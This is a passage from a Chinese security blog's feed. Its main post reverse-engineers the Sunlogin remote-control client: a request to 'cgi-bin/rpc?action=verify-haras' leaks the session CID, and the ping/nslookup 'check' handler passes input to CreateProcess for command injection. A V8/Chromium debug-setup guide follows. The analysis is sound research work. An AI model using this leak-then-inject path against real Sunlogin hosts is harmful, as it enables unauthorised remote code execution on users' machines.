张图，就可以搞懂「零拷贝」了<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://man7.org/linux/man-pages/man2/sendfile.2.html" >sendfile man手册<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://paper.seebug.org/1843/" >知道创宇ghost461师傅的分析<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://qinglinmao8315.github.io/linux/2018/03/14/linux-page-cache.html" >Linux Page Cache的理解<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://en.wikipedia.org/wiki/Page_cache" >Page cache维基百科<i class="fas fa-external-link-alt"></i></a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2022-0847-dirtypipe-linux本地提权全网第二详细漏洞分析&quot;&gt;&lt;a href=&quot;#CVE-2022-0847-dirtypipe-linux本地提权全网第二详细漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-20</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="linux" scheme="https://fa1lr4in.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>sunlogin rce分析</title>
    <link href="https://fa1lr4in.github.io/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/"/>
    <id>https://fa1lr4in.github.io/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/</id>
    <published>2022-03-11T02:39:43.000Z</published>
    <updated>2022-04-19T09:15:04.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sunloginl-rce漏洞分析"><a href="#sunloginl-rce漏洞分析" class="headerlink" title="sunloginl rce漏洞分析"></a>sunloginl rce漏洞分析</h1><p>首先分析二进制文件，拖入ida</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220304114927894.png" alt="image-20220304114927894"></p><p>发现被加壳，die（detect it easy）查壳发现是upx，使用github官方的upx最新版脱壳即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d xxx.exe</span><br></pre></td></tr></table></figure><p>注意最新的工具脱壳后无法直接执行，应该是upx在加壳的过程中将基址存在了某个寄存器或内存中，而脱壳过程中将这段代码删除了，导致无法找到对应的基址。</p><p>但是可以拖入ida进行分析</p><p>脱壳后拖入ida进行分析，脱壳后针对于SunloginClient_11.0.0.33162_X64文件关键函数偏移为0xE1D0DE，和start函数的offset为0x2DAFDE</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220304142949397.png" alt="image-20220304142949397"></p><p>verify-haras功能点为本次出现敏感信息泄露的关键功能，下面根据补丁对比看下实际功能</p><h2 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h2><p>查看补丁前和补丁后泄露CID的接口，其中<code>sub_1400F0690</code>函数用于http response</p><p>补丁前</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220218103439485.png" alt="image-20220218103439485"></p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220218104348197.png" alt="image-20220218104348197"></p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220218103647874.png" alt="image-20220218103647874"></p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220218104104984.png" alt="image-20220218104104984"></p><p>补丁后将相关的功能点删除了</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220218103941374.png" alt="image-20220218103941374"></p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220218104144818.png" alt="image-20220218104144818"></p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>这里我将详细的调试以及跟踪过程都放入了文章，方便感兴趣的小伙伴自己调试复现，说不定会发现惊喜。</p><p>由于脱壳后程序无法执行，所以笔者采用了带壳调试的方式，调试方式为首先运行待调试程序，然后找到开放端口的向日葵进程，之后attach入该进程即可调试。</p><p>具体做法就是通过esp定律定位到oep，之后通过相对偏移在关键位置下断点，而带壳调试有两个比较麻烦的点，一是定位关键代码相对来说困难一些，二是无法观察函数调用栈，因为都是在壳函数中完成的所有操作。</p><p>上面已经得出，我个人的SunloginClient_11.0.0.33162_X64文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea     rdx, aVerifyHaras ; &quot;verify-haras&quot;</span><br></pre></td></tr></table></figure><p>偏移为0xE1D0DE，和start函数的offset为0x2DAFDE，所以根据偏移在动态调试时下硬件断点（软件断点无法跟入到该代码处，暂时不清楚原因），之后保持向日葵在运行状态，之后浏览器访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:port/cgi-bin/rpc?action=verify-haras</span><br></pre></td></tr></table></figure><p>程序将会断在上述指令处。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220307092335122.png" alt="image-20220307092335122"></p><p>之后单步执行，观察函数传入的参数，rcx与rdx均为<code>verify-haras</code>。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220307092731581.png" alt="image-20220307092731581"></p><p>之后调用了函数，返回值为<code>&quot;dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3&quot;</code>，暂时不清楚该字符串代表什么含义，也不清楚不同次的执行该字符串是否会变化</p><p> <img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220307101428510.png" alt="image-20220307101428510"></p><p>之后调用函数将两个字符串拼接，查看返回值（也就是rax寄存器）证实了我们的猜想。这时我们可以解决刚刚的疑惑，也就是说第二个字符串就是CID（但是这里我们已经知道漏洞详情从而分析漏洞，如果没有知道漏洞详情，那么该漏洞的挖掘就是一门技术活了）。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220307103855751.png" alt="image-20220307103855751"></p><p>之后相应包中就带上了CID相关的信息</p><p>这时候我们比较好奇，为什么要拼接这样的get请求来达到信息泄露的目的呢，通过ida查看该函数的交叉引用（下面对应的解释以及注释均为笔者根据调试自己的漏洞环境得出的结论，详细的调试过程就不贴出了）</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309095920800.png" alt="image-20220309095920800"></p><p>可以看到验证了cgi-bin/rpc的接口，向上查看，发现还有</p><blockquote><p>login.cgi</p><p>cgi-bin/login.cgi</p><p>express_login</p><p>desktop.list</p><p>cloudconfig</p><p>transfer</p><p>micro-live/enable</p><p>check</p><p>getfastcode</p><p>assist</p><p>projection</p><p>getaddress</p></blockquote><p>在查找字符串的时候也发现了对应的注册，上面图片里面的逻辑其实就是449行对应的函数</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309101030290.png" alt="image-20220309101030290"></p><p>这时我们向下找，在该函数中，我们可以看到在处理action时，通过第266行获得了action的参数值并放入action_parameter变量中。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309101640062.png" alt="image-20220309101640062"></p><p>接下来拿获取到的参数值与字符串<code>verify-haras</code>做对比，如果匹配，则进入if逻辑，很显然，我们构造的action的参数值就是<code>verify-haras</code>，进入if逻辑后，if里面的Src存放了http的响应包，这里第398行调用了函数来生成一串随机字符串，该随机字符串就是CID，最后将拼接后的Src返回给用户，即泄露了CID（注意这里的CID是每次请求都会变化的）。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309101954543.png" alt="image-20220309101954543"></p><p>可以看下403行对应释放内存的逻辑，14行将原来索引到CID对应内存的指针的最后一位置为0，所以通过偏移是可能索引到被释放的内存的，有引发内存错误的风险，</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309102736358.png" alt="image-20220309102736358"></p><h2 id="调试tips"><a href="#调试tips" class="headerlink" title="调试tips"></a>调试tips</h2><p>在字符串ida字符串搜索时看到了很多带有cgi-bin/rpc对应的关键字，比如</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309104405136.png" alt="image-20220309104405136"></p><p>比如</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309104435867.png" alt="image-20220309104435867"></p><p>还比如</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309104504014.png" alt="image-20220309104504014"></p><p>具体定位方式实际上就是给每个cgi-bin/rpc的位置处下断点，简单有效，实际上动态调试的目的也在于此，当某个变量的含义不确定或者判断某段代码是否会执行，或者调试exp时观察是否会执行对应逻辑都很有效果。</p><p>还有需要注意的一点</p><p>调试程序时如果出现派生进程以及多线程，一定要attach对应的漏洞进程，否则可能无法断在断点处。多线程调试时如果只关注某个功能点，可以将其他进程暂时挂起（比如这里的cgi-bin）.</p><p>ida_verify_haras:    140E1D0DE</p><p>ida_action：           140E1CC51</p><p>1： 140594909        88 87D5</p><p>2： 140595253        887e8b</p><p>3： 140E2173E        4660</p><p>debug_verify_haras：    00007FF76698D0DE</p><p>1： 7FF7 6610 4909</p><p>2： 7FF7 6610 5253</p><p>3： 7FF7 6699 173E        yes</p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>上面已经统计了开放的接口，直接找check对应的处理函数</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309114647966.png" alt="image-20220309114647966"></p><p>跟进246行，在处理cmd参数时，比对了两个参数值ping和nslookup</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309114827874.png" alt="image-20220309114827874"></p><p>而这两个参数值存在rce漏洞</p><p>ida_cmd_parameter：    140E1B905</p><p>之后执行了167行的逻辑</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309175934721.png" alt="image-20220309175934721"></p><p>调用了CreateProcess执行了传入的命令</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309180023753.png" alt="image-20220309180023753"></p><p>调试可以明显观察到执行了CreateProcessA进程</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309153341313.png" alt="image-20220309153341313"></p><p>执行ReadFile后，将执行后的结果放入Buffer指向的内存中了。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220309155222492.png" alt="image-20220309155222492"></p><p>这时有一个问题，既然直接给ping或nslookup传递拼接的命令就可以执行任意代码，那为什么要在cookie中传入CID呢。cookie中的CID的作用是什么呢，我们在函数中没有看到对应的校验逻辑，下面的图就是执行代码的逻辑，可以看到只有v21是个类似于校验的值，但仔细分析发现，v21只可以判断参数名称是否为<code>ping</code>或<code>nslookup</code>。</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220310110455058.png" alt="image-20220310110455058"></p><p>笔者在复现的时候走了些许弯路，尝试了寻找CID、cookie对应的字符串，发现没有在任何一处断点断下。</p><p>这里有一个比较坑的一点在于：ida的shift+f12并不能发现所有注册的字符串，有些明显的字符串形式并没有被shift+f12统计到，所以我们在分析代码逻辑时不要过度依赖于shift+f12的功能（比如在查找<code>cgi-bin/rpc</code>字符串时，shift+f12就没有统计到关键代码位置）</p><p>最后通过错误信息定位到CID校验点</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220310111805487.png" alt="image-20220310111805487"></p><p>通过流量可以发现，当我们不传入CID时，response body返回了报错信息，这时我们通过这个报错信息到ida中查找</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220310111917581.png" alt="image-20220310111917581"></p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220310111931612.png" alt="image-20220310111931612"></p><p>将上面两个函数对应报错位置处下断点，很容易发现实际上是第二个函数做了校验</p><p>下面是不断尝试所得到的数据=(</p><blockquote><p>ida_verify_haras:    140E1D0DE        </p><p>ida_cid_1：            1409F5BF1        -42 74ED</p><p>ida_cid_2：            140204F9A        -C1 8144</p><p>ida_cid_3：            140112979        -D0 A765</p><p>ida_cid_4：            140E209B8        38DA</p><p>debug_verify_haras：    00007FF76698D0DE</p><p>debug_cid_1：            7FF7 6656 5BF1        -42 74ED</p><p>debug_cid_2：            7FF7 65D7 4F9A        -C1 8144</p><p>debug_cid_3：            7FF7 65C8 2979        -D0 A765</p><p>debug_cid_4：            7FF7 6699 09B8        38DA</p><p>ida_verify_haras:    140E1D0DE</p><p>ida_cookie_1：            140204F3F        -C1 819F</p><p>ida_cookie_2：            14057F7D8        -89 D906</p><p>ida_cookie_3：            1409F4A60        -42 867E</p><p>ida_cookie_4：            140111141         -D0 BF9D</p><p>ida_cookie_5：            14014D5AA        -CC FB34</p><p>debug_verify_haras：    00007FF7142ED0DE</p><p>debug_cookie_1：            7FF7 136D 4F3F</p><p>debug_cookie_2：            7FF7 13A4 F7D8</p><p>debug_cookie_3：            7FF7 13EC 4A60</p><p>debug_cookie_4：            7FF7 135E 1141</p><p>debug_cookie_5：            7FF7 1361 D5AA</p><p>ida_verify_haras:    140E1D0DE</p><p>ida_verification_failture_1:        14020528F            C1 7E4F</p><p>ida_verification_failture_2:        140E13659            9A85</p><p>debug_verify_haras：    00007FF7142ED0DE</p><p>debug_verification_failture_1:        7FF7 136D 528F</p><p>debug_verification_failture_2:        7FF7 142E 3659        yes</p></blockquote><p>最终定位到了在该位置处做了校验，如果CID检验失败，则返回红框中的报错信息</p><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220310112401244.png" alt="image-20220310112401244"></p><p>校验逻辑的反汇编代码如下，通过计算相对便宜即可在ida中定位到，具体的校验逻辑感兴趣的小伙伴可以进行分析</p><blockquote><p>00007FF7142ED0DE</p><p>00007FF7142D6470        1 6C6E</p></blockquote><p><img src="/2022/03/11/sunlogin-rce%E5%88%86%E6%9E%90/image-20220310154208929.png" alt="image-20220310154208929"></p><h2 id="漏洞挖掘tips"><a href="#漏洞挖掘tips" class="headerlink" title="漏洞挖掘tips"></a>漏洞挖掘tips</h2><p>CreateProcessA等危险函数</p><p>暴露的多个接口</p><p>关键session（如CID）的信息泄露</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://www.cnblogs.com/zUotTe0/p/15913108.html" >https://www.cnblogs.com/zUotTe0/p/15913108.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sunloginl-rce漏洞分析&quot;&gt;&lt;a href=&quot;#sunloginl-rce漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;sunloginl rce漏洞分析&quot;&gt;&lt;/a&gt;sunloginl rce漏洞分析&lt;/h1&gt;&lt;p&gt;首先分析二进制文件，</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="https://fa1lr4in.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="windows" scheme="https://fa1lr4in.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu chromium+v8调试环境搭建</title>
    <link href="https://fa1lr4in.github.io/2022/02/24/ubuntu-chromium-v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://fa1lr4in.github.io/2022/02/24/ubuntu-chromium-v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-02-24T11:34:40.000Z</published>
    <updated>2022-04-19T09:12:17.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-chromium-v8调试环境搭建"><a href="#ubuntu-chromium-v8调试环境搭建" class="headerlink" title="ubuntu chromium+v8调试环境搭建"></a>ubuntu chromium+v8调试环境搭建</h1><h2 id="Ubuntu环境配置"><a href="#Ubuntu环境配置" class="headerlink" title="Ubuntu环境配置"></a>Ubuntu环境配置</h2><p>1、允许root登录并进行ubuntu初始修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line">cp /home/ubuntu/.bashrc /root/</span><br><span class="line">apt update &amp;&amp; apt install ssh vim python git libproxy-tools re2c g++</span><br><span class="line">vi /etc/ssh/sshd_config<span class="comment"># 修改 PermitRootLogin yes</span></span><br><span class="line">vi /etc/pam.d/gdm-autologin<span class="comment"># 注释auth   required        pam_succeed_if.so user != root quiet_success</span></span><br><span class="line">vi /etc/pam.d/gdm-password<span class="comment"># 注释auth   required        pam_succeed_if.so user != root quiet_success</span></span><br><span class="line">vi /root/.profile    <span class="comment"># 改成 tty -s &amp;&amp; mesg n || true</span></span><br></pre></td></tr></table></figure><p><del>2、配置linux全局代理，使终端可以访问墙外的v8编译相关资源</del></p><p><del>比如qv2ray，相关链接：<a class="link"   href="https://www.zsxcool.com/7137.html" >https://www.zsxcool.com/7137.html<i class="fas fa-external-link-alt"></i></a></del></p><p><del>再比如Trojan-QT5，相关链接：<a class="link"   href="https://github.com/Shadowsocks-Wiki/shadowsocks/blob/master/zh_CN/trojan/ubuntu-trojan-qt5-setup-guide.md" >https://github.com/Shadowsocks-Wiki/shadowsocks/blob/master/zh_CN/trojan/ubuntu-trojan-qt5-setup-guide.md<i class="fas fa-external-link-alt"></i></a></del></p><p>2、一般采用虚拟机搭建v8环境，方便环境的维护，推荐虚拟机采用vmware NAT那块网卡，这时我们在本地做全局代理时（比如Netch），虚拟机内部也可以有比较顺畅的网络环境。</p><h2 id="v8环境配置"><a href="#v8环境配置" class="headerlink" title="v8环境配置"></a>v8环境配置</h2><p>下载depot_tools，v8并进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/tools &amp;&amp; <span class="built_in">cd</span> /root/tools</span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc或者<span class="built_in">source</span> ~/.zshrc</span><br><span class="line"><span class="comment"># Todo 忘记是否需要自行安装Ninja了。。。</span></span><br><span class="line">mkdir /root/v8 &amp;&amp; <span class="built_in">cd</span> /root/v8</span><br><span class="line">fetch v8   <span class="comment"># 这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步</span></span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line"><span class="comment"># git reset --hard [commit hash]# 切换版本，后面跟上commit的hash值，可选</span></span><br><span class="line"><span class="comment"># gclient sync</span></span><br><span class="line">sudo ./build/install-build-deps.sh --no-chromeos-fonts<span class="comment"># 在linux系统中这个命令是需要的</span></span><br><span class="line">gclient sync  <span class="comment"># 同步更新</span></span><br><span class="line"><span class="comment"># 编译可执行文件</span></span><br><span class="line">tools/dev/gm.py x64.debug <span class="comment"># 编译 debug 版本编译的过程可能会花上比较长的时间</span></span><br><span class="line">tools/dev/gm.py x64.release <span class="comment"># 编译 release 版本</span></span><br><span class="line"><span class="comment"># 或通过gn构建，方便我们自定义参数，比如下面加入了asan检测和afl支持，传统的afl fuzz整个程序（d8）很难会有产出，如果非要用afl可以自行编写harness，类似libfuzzer</span></span><br><span class="line">gn gen out/use_afl --args=<span class="string">&quot;is_debug=true is_component_build=true is_asan = true use_afl = true optimize_for_fuzzing = true&quot;</span></span><br><span class="line">ninja -C out/use_afl d8</span><br></pre></td></tr></table></figure><p><strong>过程中遇到的问题</strong></p><p>1、running depot tools as root is sad</p><p>如果root用户使用该工具会弹出该警告，无视即可</p><p>2、遇到 NOTICE: You have PROXY values set in your environment, but gsutilin depot_tools does not (yet) obey them.<br>Also, –no_auth prevents the normal BOTO_CONFIG environmentvariable from being used.<br>To use a proxy in this situation, please supply those settingsin a .boto file pointed to by the NO_AUTH_BOTO_CONFIG environmentvariable.</p><p>缺少代理的环境变量，基本在你自己在虚拟机内布置代理环境才会出现这个问题，采用NAT网卡一般不会出现这个问题，踩太多坑了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/tools/.boto</span><br><span class="line">vi .boto</span><br><span class="line"><span class="comment"># [Boto]</span></span><br><span class="line"><span class="comment"># debug = 0</span></span><br><span class="line"><span class="comment"># num_retries = 10</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># proxy = 127.0.0.1</span></span><br><span class="line"><span class="comment"># proxy_port = 58591</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export NO_AUTH_BOTO_CONFIG=&quot;/root/tools/.boto&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export NO_AUTH_BOTO_CONFIG=&quot;/root/tools/.boto&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc或者<span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><p>3、Failed to download <a class="link"   href="https://commondatastorage.googleapis.com/chrome-linux-sysroot/toolchain/43a87bbebccad99325fdcf34166295b121ee15c7/debian_sid_amd64_sysroot.tar.xz" >https://commondatastorage.googleapis.com/chrome-linux-sysroot/toolchain/43a87bbebccad99325fdcf34166295b121ee15c7/debian_sid_amd64_sysroot.tar.xz<i class="fas fa-external-link-alt"></i></a><br>Error: Command ‘vpython build/linux/sysroot_scripts/install-sysroot.py –arch=x64’ returned non-zero exit status 1 in /root/v8/v8</p><p>出现这种问题是因为网络原因，可以重新进行gclient sync或更换代理服务器</p><p>4、Error: client not configured; see ‘gclient config’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gclient config https://chromium.googlesource.com/chromium/src.git</span></span><br><span class="line">gclient config https://chromium.googlesource.com/v8/v8.git</span><br><span class="line">gclient runhooks</span><br></pre></td></tr></table></figure><p>参考链接：<a class="link"   href="https://stackoverflow.com/questions/8684282/gclient-runhooks-fails" >https://stackoverflow.com/questions/8684282/gclient-runhooks-fails<i class="fas fa-external-link-alt"></i></a></p><h2 id="chromium环境配置"><a href="#chromium环境配置" class="headerlink" title="chromium环境配置"></a>chromium环境配置</h2><p>有了上面v8搭建的过程，这里的过程看起来就更容易理解一些，实际上二者的搭建过程没有太大的差距，因为google官方将搭建过程都封装到了depot_tools中了。二者的体量差别还是比较大的，截至2022.1，chromium最新大概5w多个文件，而v8在2k文件左右</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/chromium &amp;&amp; <span class="built_in">cd</span> ~/chromium</span><br><span class="line">fetch --nohooks chromium</span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">gclient runhooks</span><br><span class="line"><span class="comment"># git reset --hard [commit hash]# 切换版本，后面跟上commit的hash值，可选</span></span><br><span class="line"><span class="comment"># gclient sync</span></span><br><span class="line"><span class="comment"># 配置编译选项，可以使用 use_afl = true 参数开启afl fuzz功能，但目前不知道如何结合afl对chromium进行fuzz，而且在不编写harness的情况下效率还是比较低的。</span></span><br><span class="line">gn gen out/asan_debug --args=<span class="string">&quot;is_debug=true is_component_build=true is_asan = true&quot;</span> </span><br><span class="line"><span class="comment"># 开始编译，可能需要数个小时</span></span><br><span class="line">autoninja -C out/asan_debug chrome</span><br></pre></td></tr></table></figure><p>启动chromium时，asan提示<code>odr-violation</code>报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Kiprey @ Kipwn in /usr/class/chromium [14:19:24] C:1</span><br><span class="line">$ ./src/out/asan_debug/chrome</span><br><span class="line">=================================================================</span><br><span class="line">==189815==ERROR: AddressSanitizer: odr-violation (0x7f44b9504700):</span><br><span class="line">  [1] size=40 &#x27;vtable for media::VaapiDmaBufVideoFrameMapper&#x27; ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc</span><br><span class="line">  [2] size=40 &#x27;vtable for media::VaapiDmaBufVideoFrameMapper&#x27; ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc</span><br><span class="line">These globals were registered at these points:</span><br><span class="line">  [1]:</span><br><span class="line">    #0 0x55f8a95f810d in __asan_register_globals /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_globals.cpp:360:3</span><br><span class="line">    #1 0x7f4471d6895b in asan.module_ctor (/usr/class/chromium/src/out/asan_debug/libservice.so+0x2b5595b)</span><br><span class="line"></span><br><span class="line">  [2]:</span><br><span class="line">    #0 0x55f8a95f810d in __asan_register_globals /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_globals.cpp:360:3</span><br><span class="line">    #1 0x7f44b87abe7b in asan.module_ctor (/usr/class/chromium/src/out/asan_debug/libmedia_gpu.so+0x335e7b)</span><br><span class="line"></span><br><span class="line">==189815==HINT: if you don&#x27;t care about these errors you may set ASAN_OPTIONS=detect_odr_violation=0</span><br><span class="line">SUMMARY: AddressSanitizer: odr-violation: global &#x27;vtable for media::VaapiDmaBufVideoFrameMapper&#x27; at ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc</span><br><span class="line">==189815==ABORTING</span><br></pre></td></tr></table></figure><p><code>odr-violation</code>这类错误我们忽略即可，因此我们需要设置一下环境变量<code>ASAN_OPTIONS</code>，最好编辑配置文件将其永久配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ASAN_OPTIONS=detect_odr_violation=0</span><br></pre></td></tr></table></figure><p>之后即可正常执行chrome。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a class="link"   href="https://kiprey.github.io/2020/11/fetch-chromium/" >https://kiprey.github.io/2020/11/fetch-chromium/<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://bbs.pediy.com/thread-252812-1.htm" >https://bbs.pediy.com/thread-252812-1.htm<i class="fas fa-external-link-alt"></i></a></li><li><a href="browser-pwn-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.pdf">browser-pwn-基础知识.pdf</a> </li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="1、vscode关闭代码错误提示"><a href="#1、vscode关闭代码错误提示" class="headerlink" title="1、vscode关闭代码错误提示"></a>1、vscode关闭代码错误提示</h3><p>vscode内Ctrl + Shift + P搜索：errorSquiggles，禁用错误波形曲线</p><h3 id="2、配置gdb插件"><a href="#2、配置gdb插件" class="headerlink" title="2、配置gdb插件"></a>2、配置gdb插件</h3><p>下面可以挑选一个gdb调试工具，统一将gdb脚本的路径放入<code>/root/.gdbinit</code>中。</p><h4 id="gef"><a href="#gef" class="headerlink" title="gef"></a>gef</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef</span><br><span class="line"><span class="comment"># 